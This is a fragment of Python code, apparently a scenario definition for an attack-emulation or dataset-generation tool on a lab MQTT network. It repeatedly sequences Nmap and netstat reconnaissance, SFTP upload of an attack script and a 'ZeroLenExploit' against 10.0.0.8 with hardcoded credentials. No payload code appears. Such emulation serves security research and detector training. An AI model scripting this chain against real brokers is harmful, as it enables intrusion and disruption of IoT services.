            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),), (NmapSubDiscStep("10.0.0.8", pause=0), 1
                                                      ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (SftpInstStep("10.0.0.8", ["/zero_len_attack.py", "/mqtt_utilities.py"], pause=0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),), (NmapSubDiscStep("10.0.0.8", pause=0), 1
                                                      ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (SftpInstStep("10.0.0.8", ["/zero_len_attack.py", "/mqtt_utilities.py"], pause=0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),), (NmapSubDiscStep("10.0.0.8", pause=0), 1
                                                      ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (SftpInstStep("10.0.0.8", ["/zero_len_attack.py", "/mqtt_utilities.py"], pause=0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),), (NmapSubDiscStep("10.0.0.8", pause=0), 1
                                                      ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (SftpInstStep("10.0.0.8", ["/zero_len_attack.py", "/mqtt_utilities.py"], pause=0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),), (NmapSubDiscStep("10.0.0.8", pause=0), 1
                                                      ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (SftpInstStep("10.0.0.8", ["/zero_len_attack.py", "/mqtt_utilities.py"], pause=0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),), (NmapSubDiscStep("10.0.0.8", pause=0), 1
                                                      ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (SftpInstStep("10.0.0.8", ["/zero_len_attack.py", "/mqtt_utilities.py"], pause=0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),), (NmapSubDiscStep("10.0.0.8", pause=0), 1
                                                      ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (SftpInstStep("10.0.0.8", ["/zero_len_attack.py", "/mqtt_utilities.py"], pause=0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
